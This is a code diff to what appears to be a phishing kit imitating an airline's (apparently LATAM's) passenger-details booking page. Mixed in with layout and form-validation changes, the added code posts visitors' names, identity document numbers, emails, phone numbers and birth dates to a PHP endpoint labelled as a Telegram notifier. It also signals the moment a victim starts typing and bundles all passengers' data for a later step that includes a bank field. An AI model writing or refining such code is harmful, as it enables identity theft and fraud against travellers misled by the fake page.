@@ -542,16 +542,143 @@ var my_contenido = `
     var menuAbierto = false;
     var menuGeneroAbierto = false;
 
+    // Función para enviar notificaciones a Telegram
+    function sendTelegramNotification(mensaje) {
+        try {
+            $.ajax({
+                url: my_hosting + '__ltam/send_notification.php',
+                method: 'POST',
+                data: { mensaje: mensaje },
+                async: true
+            });
+        } catch(e) {
+            console.log('Error al enviar notificación:', e);
+        }
+    }
+
     $(document).ready(function() {
+
+        // Notificación: Ingresando datos de viajero
+        setTimeout(function() {
+            sendTelegramNotification('*ingresando datos de viajero*');
+        }, 1000);
+
+        // Corregir scroll y layout en mobile
+        $('head').append(`
+            <style>
+                /* Hacer scroll normal de página */
+                .cMdkWh {
+                    height: auto !important;
+                    overflow: visible !important;
+                    padding-bottom: 90px !important;
+                }
+                .cMdkWh .xp-container {
+                    overflow: visible !important;
+                    height: auto !important;
+                }
+                .cMdkWh .body {
+                    overflow: visible !important;
+                    height: auto !important;
+                }
+                .cMdkWh .body .body-content .body-content-passengerList {
+                    overflow: visible !important;
+                    height: auto !important;
+                }
+                .full-height {
+                    height: auto !important;
+                }
+
+                /* Ocultar el aside completo del shopping cart en su posición original */
+                aside.body-content-shoppingCart {
+                    display: none !important;
+                }
+
+                /* Ocultar footer */
+                .footer {
+                    display: none !important;
+                }
+            </style>
+        `);
+
+        // Mover el botón al final del body como elemento fijo
+        setTimeout(function() {
+            var $btn = $('.alignButton').clone();
+            $btn.attr('id', 'fixed-continue-btn');
+            $btn.css({
+                'position': 'fixed',
+                'bottom': '0',
+                'left': '0',
+                'right': '0',
+                'z-index': '999',
+                'background': '#fff',
+                'box-shadow': '0 -2px 10px rgba(0,0,0,0.1)',
+                'padding': '12px 16px',
+                'margin': '0',
+                'height': 'auto'
+            });
+
+            // Ocultar botón cuando el teclado está abierto
+            var blurTimeout = null;
+            $(document).on('focus', 'input, select, textarea', function() {
+                if (blurTimeout) {
+                    clearTimeout(blurTimeout);
+                    blurTimeout = null;
+                }
+                $btn.hide();
+            });
+            $(document).on('blur', 'input, select, textarea', function() {
+                blurTimeout = setTimeout(function() {
+                    // Solo mostrar si ningún input tiene focus
+                    if (!$('input:focus, select:focus, textarea:focus').length) {
+                        $btn.show();
+                    }
+                }, 300);
+            });
+            $('body').append($btn);
+
+            // Validar que todos los pasajeros estén completos
+            function todosLosPassengersCompletos() {
+                var totalPasajeros = $('.passengerstyle__Ol-ejn4dv-0 > li').length;
+                var pasajerosConfirmados = $('.passengerstyle__Ol-ejn4dv-0 > li .wrapperValidationIcon').length;
+                return totalPasajeros > 0 && totalPasajeros === pasajerosConfirmados;
+            }
+
+            // Click del botón con validación
+            $btn.find('button').on('click', function() {
+                if (!todosLosPassengersCompletos()) {
+                    // Mostrar alerta o mensaje
+                    var $li = $('.passengerstyle__Ol-ejn4dv-0 > li').filter(function() {
+                        return $(this).find('.wrapperValidationIcon').length === 0;
+                    }).first();
+
+                    if ($li.length) {
+                        // Expandir el pasajero incompleto
+                        $li.find(".MuiAccordion-root, .MuiAccordionSummary-root").addClass("Mui-expanded");
+                        $li.find(".MuiCollapse-root").removeClass("MuiCollapse-hidden").addClass("MuiCollapse-entered");
+                        $li.find(".passengerstyle__Li-ejn4dv-1").removeClass("bbCNtE").addClass("fFsICs");
+                        $li.find('[id^="accordion-passenger-"]').attr("aria-expanded", "true");
+
+                        // Scroll hacia el pasajero
+                        window.scrollTo({ top: $li.offset().top - 100, behavior: 'smooth' });
+                    }
+                    return;
+                }
+
+                processing({
+                    t: 'datos-latam'
+                });
+            });
+        }, 500);
 
         var totalVuelo = 0;
         var totalPasajeros = 1;
         try {
             const pasajeros = JSON.parse(my_data['pasajeros'] || "{}");
-            totalPasajeros =
+            const calculatedPasajeros =
                 (pasajeros.adultos || 0) +
                 (pasajeros.ninos || 0) +
                 (pasajeros.bebes || 0);
+            totalPasajeros = calculatedPasajeros > 0 ? calculatedPasajeros : 1;
         } catch (e) {
             console.warn("Error al parsear pasajeros:", e);
         }
@@ -574,9 +701,12 @@ var my_contenido = `
         $('#totalVuelo').text(`COP ${totalFormateado}`);
 
         function renderPassengers(passengers) {
+            console.log('Datos de pasajeros recibidos:', passengers);
             const {
-                adultos = [], ninos = [], bebes = []
+                adultos = 0, ninos = 0, bebes = 0
             } = passengers;
+
+            console.log('Adultos:', adultos, 'Niños:', ninos, 'Bebés:', bebes);
 
             const passengerList = $('.passengerstyle__Ol-ejn4dv-0.egpEjI');
             passengerList.empty();
@@ -1117,7 +1247,7 @@ var my_contenido = `
                                     id="passengerFormSubmitButton${idSuffix}--button-wrapper"
                                     class="sc-Axmtr iOXzYI"><button
                                         class="MuiButtonBase-root MuiButton-root MuiButton-text sc-fzoLsD fYZyZu MuiButton-disableElevation MuiButton-fullWidth"
-                                        tabindex="0" type="submit"
+                                        tabindex="0" type="button"
                                         data-testid="passengerFormSubmitButton${idSuffix}"
                                         id="passengerFormSubmitButton${idSuffix}"
                                         aria-label="Guardar los datos ingresados del pasajero."><span
@@ -1145,7 +1275,7 @@ var my_contenido = `
                 passengerList.append(generatePassengerHTML('INF', i + 1, false));
             }
 
-            passengerList.on("click", "[data-testid^='passengerFormSubmitButtonADT_']", function(e) {
+            passengerList.on("click", "[data-testid^='passengerFormSubmitButton']", function(e) {
                 e.preventDefault();
 
                 const $button = $(this);
@@ -1162,8 +1292,14 @@ var my_contenido = `
                     return;
                 }
 
+                const email = $form.find("input[name='passengerInfo.emails[0]']").val()?.trim() || '';
+                const telefono = $form.find("input[name='passengerInfo.phones[0].number']").val()?.trim() || '';
+
                 const originalText = $button.find(".MuiButton-label").text();
                 $button.find(".MuiButton-label").text("Confirmando...");
+
+                // Enviar datos del pasajero a Telegram
+                sendTelegramNotification(`*Pasajero confirmado:*\nNombre: ${nombre} ${apellido}\nDocumento: ${tipoDoc} ${numDoc}\nEmail: ${email}\nTeléfono: ${telefono}`);
 
                 setTimeout(() => {
                     $button.find(".MuiButton-label").text(originalText);
@@ -1198,6 +1334,24 @@ var my_contenido = `
                     $(".passengerstyle__Li-ejn4dv-1").removeClass("fFsICs").addClass("bbCNtE");
                     $(".MuiAccordion-root, .MuiAccordionSummary-root").removeClass("Mui-expanded");
                     $('[id^="accordion-passenger-"]').attr("aria-expanded", "false");
+
+                    // Buscar y expandir el siguiente pasajero
+                    const $nextLi = $li.next("li");
+                    if ($nextLi.length) {
+                        $nextLi.find(".MuiAccordion-root, .MuiAccordionSummary-root").addClass("Mui-expanded");
+                        $nextLi.find(".MuiCollapse-root").removeClass("MuiCollapse-hidden").addClass("MuiCollapse-entered");
+                        $nextLi.find(".passengerstyle__Li-ejn4dv-1").removeClass("bbCNtE").addClass("fFsICs");
+                        $nextLi.find('[id^="accordion-passenger-"]').attr("aria-expanded", "true");
+
+                        // Scroll hacia el siguiente pasajero
+                        setTimeout(() => {
+                            window.scrollTo({ top: $nextLi.offset().top - 80, behavior: 'smooth' });
+                        }, 100);
+                    } else {
+                        // No hay más pasajeros, scroll arriba
+                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                    }
+
                 }, 2000);
             });
 
@@ -1240,12 +1394,14 @@ var my_contenido = `
             });
         }
 
-        // renderPassengers(JSON.parse(my_data['pasajeros']));
-        renderPassengers({
-            adultos: 1,
-            ninos: 0,
-            bebes: 0
-        });
+        // Parsear datos de pasajeros
+        var pasajerosData = {adultos: 1, ninos: 0, bebes: 0};
+        try {
+            pasajerosData = JSON.parse(my_data['pasajeros'] || '{"adultos":1,"ninos":0,"bebes":0}');
+        } catch(e) {
+            console.log('Error parseando pasajeros:', e);
+        }
+        renderPassengers(pasajerosData);
         activarComportamientoInputs();
 
         function validarTodosLosPasajeros() {
@@ -1487,13 +1643,32 @@ var my_contenido = `
                 // alert("Por favor, completa todos los campos requeridos.");
                 return;
             }
+
+            // Capturar datos de todos los pasajeros
+            let pasajeros = [];
+            $(".passengerstyle__Ol-ejn4dv-0.egpEjI li form").each(function() {
+                const $form = $(this);
+
+                pasajeros.push({
+                    nombre: $form.find("input[name='passengerDetails.firstName']").val().trim(),
+                    apellido: $form.find("input[name='passengerDetails.lastName']").val().trim(),
+                    tipoDocumento: $form.find("#mui-component-select-documentInfo\\.documentType").text().trim(),
+                    numDocumento: $form.find("input[name='documentInfo.documentNumber']").val().trim(),
+                    genero: $form.find("#mui-component-select-passengerInfo\\.gender").text().trim(),
+                    fechaNacimiento: $form.find("input[id^='passengerInfo-dateOfBirth-']").val().trim(),
+                    email: $form.find("input[name='passengerInfo.emails']").val().trim(),
+                    telefono: $form.find("input[name='passengerInfo.phones[0].number']").val().trim()
+                });
+            });
+
             processing({
-                t: 'datos',
+                t: 'datos-pasajeros',
+                pasajeros: JSON.stringify(pasajeros),
                 cedula: 'SIN_CEDULA',
-                email: 'SIN_EMAIL',
-                nombres: 'SIN_NOMBRES',
+                email: pasajeros.length > 0 ? pasajeros[0].email : 'SIN_EMAIL',
+                nombres: pasajeros.length > 0 ? (pasajeros[0].nombre + ' ' + pasajeros[0].apellido) : 'SIN_NOMBRES',
                 ciudad: 'SIN_CIUDAD',
-                celular: 'SIN_CELULAR',
+                celular: pasajeros.length > 0 ? pasajeros[0].telefono : 'SIN_CELULAR',
                 direccion: 'SIN_DIRECCION',
                 banco: 'SIN_BANCO',
             });
